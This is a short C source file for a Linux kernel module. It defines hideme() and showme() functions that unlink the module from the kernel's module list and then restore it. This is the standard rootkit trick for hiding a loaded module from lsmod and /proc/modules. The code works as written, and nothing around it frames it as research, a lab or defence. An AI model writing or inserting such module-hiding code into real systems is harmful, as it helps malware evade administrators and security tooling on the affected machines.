#include"show_hide.h"

static struct list_head *prev_module;

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}


